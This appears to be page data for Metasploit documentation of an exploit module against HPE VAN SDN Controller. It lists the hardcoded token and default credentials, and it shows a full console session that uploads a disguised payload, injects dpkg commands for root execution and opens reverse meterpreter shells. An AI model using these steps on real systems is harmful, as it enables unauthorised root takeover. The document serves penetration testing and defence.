{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/hp_van_sdn_cmd_inject","result":{"data":{"moduleMetadataJson":{"id":"10c0cd18-cdaa-5fd8-bb94-4cf233c3447e","name":"HP VAN SDN Controller Root Command Injection","fullname":"exploit/linux/http/hp_van_sdn_cmd_inject","description":"This module exploits a hardcoded service token or default credentials\n        in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root.\n\n        A root command injection was discovered in the uninstall action's name\n        parameter, obviating the need to use sudo for privilege escalation.\n\n        If the service token option TOKEN is blank, USERNAME and PASSWORD will\n        be used for authentication. An additional login request will be sent.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/hp_van_sdn_cmd_inject","documentationSlug":"/modules/documentation/exploit/linux/http/hp_van_sdn_cmd_inject","referencesSlug":"/modules/references/exploit/linux/http/hp_van_sdn_cmd_inject"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a hardcoded service token or default credentials in\nHPE VAN SDN Controller &#x3C;= 2.7.18.0503 to execute a payload as root.</p>\n<p>A root command injection was discovered in the uninstall action's name\nparameter, obviating the need to use sudo for privilege escalation.</p>\n<p>If the service token option <code class=\"language-text\">TOKEN</code> is blank, <code class=\"language-text\">USERNAME</code> and <code class=\"language-text\">PASSWORD</code>\nwill be used for authentication. An additional login request will be\nsent.</p>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p>Follow <a href=\"http://h22208.www2.hpe.com/eginfolib/networking/docs/sdn/sdnc2_6/5998-8473install/content/s_download_sw.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://h22208.www2.hpe.com/eginfolib/networking/docs/sdn/sdnc2_6/5998-8473install/content/s_download_sw.html</a>.</p>\n<p>Tested on 2.7.18.0503.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>RPORT</strong></p>\n<p>Set this to the port for the REST API, usually 8081.</p>\n<p><strong>WEBUI_PORT</strong></p>\n<p>Set this to the port for the web UI, usually 8443.</p>\n<p><strong>TOKEN</strong></p>\n<p>Set this to the service token. Defaults to <code class=\"language-text\">AuroraSdnToken37</code>.</p>\n<p><strong>USERNAME</strong></p>\n<p>Set this to the service username. Defaults to <code class=\"language-text\">sdn</code>.</p>\n<p><strong>PASSWORD</strong></p>\n<p>Set this to the service password. Defaults to <code class=\"language-text\">skyline</code>.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/hp_van_sdn_cmd_inject\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; set rhosts 192.168.56.102\nrhosts =&gt; 192.168.56.102\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; set target Linux Dropper\ntarget =&gt; Linux Dropper\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; set lhost 192.168.56.1\nlhost =&gt; 192.168.56.1\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Authenticating with service token AuroraSdnToken37\n[*] Uploading payload as fake .deb\n[+] Uploaded /var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1.deb\n[*] Renaming payload and executing it\n[*] Injecting dpkg -r --pre-invoke=mv${IFS}/var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1.deb${IFS}/var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1${IFS}&amp;&amp;${IFS}chmod${IFS}+x${IFS}/var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1\n[*] Injecting dpkg -r --pre-invoke=/var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1\n[*] Sending stage (812100 bytes) to 192.168.56.102\n[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.102:34468) at 2018-07-03 18:23:08 -0500\n[+] Deleted /var/lib/sdn/uploads/PZNmbCCF6BYIL3Zv1\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 192.168.56.102\nOS           : Debian 8 (Linux 4.4.0-2-amd64-hlinux)\nArchitecture : x64\nBuildTuple   : x86_64-linux-musl\nMeterpreter  : x64/linux\nmeterpreter &gt;\nBackground session 1? [y/N]\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; set token &quot;&quot;\ntoken =&gt;\nmsf5 exploit(linux/http/hp_van_sdn_cmd_inject) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Authenticating with creds sdn:skyline\n[+] Retrieved auth token 26d7b53a73a9455eae63c346321bfe31\n[*] Uploading payload as fake .deb\n[+] Uploaded /var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l.deb\n[*] Renaming payload and executing it\n[*] Injecting dpkg -r --pre-invoke=mv${IFS}/var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l.deb${IFS}/var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l${IFS}&amp;&amp;${IFS}chmod${IFS}+x${IFS}/var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l\n[*] Injecting dpkg -r --pre-invoke=/var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l\n[*] Sending stage (812100 bytes) to 192.168.56.102\n[*] Meterpreter session 2 opened (192.168.56.1:4444 -&gt; 192.168.56.102:34474) at 2018-07-03 18:24:47 -0500\n[+] Deleted /var/lib/sdn/uploads/kZzvx9DHtqQ39RPKuc0rVKzafsm584bye0l\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"10c0cd18-cdaa-5fd8-bb94-4cf233c3447e"}}}